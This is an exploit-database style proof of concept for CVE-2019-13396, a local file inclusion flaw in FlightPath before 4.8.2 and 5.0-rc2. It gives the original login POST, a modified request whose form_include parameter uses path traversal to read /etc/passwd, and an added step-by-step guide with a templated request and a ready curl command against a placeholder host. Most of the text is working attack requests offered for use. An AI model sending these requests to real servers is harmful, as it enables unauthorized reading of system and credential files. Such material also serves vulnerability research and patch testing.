# Exploit Title: FlightPath < 4.8.2 & < 5.0-rc2 - Local File Inclusion
# Date: 07-07-2019
# Exploit Author: Mohammed Althibyani
# Vendor Homepage: http://getflightpath.com
# Software Link: http://getflightpath.com/project/9/releases
# Version: < 4.8.2 & < 5.0-rc2
# Tested on: Kali Linux
# CVE : CVE-2019-13396


# Parameters : include_form
# POST Method:

use the login form to get right form_token [ you can use wrong user/pass ]

This is how to POST looks like:

POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1

callback=system_login_form&form_token=fb7c9d22c839e3fb5fa93fe383b30c9b&form_type=&form_path=login&form_params=YTowOnt9&form_include=&default_redirect_path=login&default_redirect_query=current_student_id%3D%26advising_student_id%3D&current_student_id=&user=test&password=test&btn_submit=Login


# modfiy the POST request to be:


POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1

callback=system_login_form&form_token=fb7c9d22c839e3fb5fa93fe383b30c9b&form_include=../../../../../../../../../etc/passwd



# Greats To : Ryan Saaty, Mohammed Al-Howsa & Haboob Team.


Instruction:

Prerequisites:

FlightPath Installation:

Ensure you have FlightPath version less than 4.8.2 or 5.0-rc2 installed and running on your server. You can download it from FlightPath Releases.
Web Server Setup:

The testing environment should include a web server such as Apache or Nginx with PHP support.
Testing Environment Preparation:

Set up a local server environment (e.g., Kali Linux) for testing.

Obtain a Valid form_token:

Log In:
Use the login form available on FlightPath to obtain a valid form_token. You can use valid or invalid credentials; the token is needed for subsequent requests.
Prepare the POST Request:

Initial Request:
The format of the POST request you need to send as shown above. 

Modify the POST Request for LFI:

Update the form_include Parameter:

Modify the form_include parameter to include a file path that you want to access, such as /etc/passwd. Your modified POST request should look like this:
POST /flightpath/index.php?q=system-handle-form-submit HTTP/1.1
Host: <target-host>
Content-Type: application/x-www-form-urlencoded
Content-Length: <length>

callback=system_login_form&form_token=<valid_form_token>&form_include=../../../../../../../../../etc/passwd
Send the Request:

Execute the Request:

Send the modified POST request using a tool like curl, Postman, or through a script.

For instance: curl -X POST -d "callback=system_login_form&form_token=<valid_form_token>&form_include=../../../../../../../../../etc/passwd" http://<target-host>/flightpath/index.php?q=system-handle-form-submit

Review the response from the server to see if the contents of /etc/passwd or another targeted file are returned.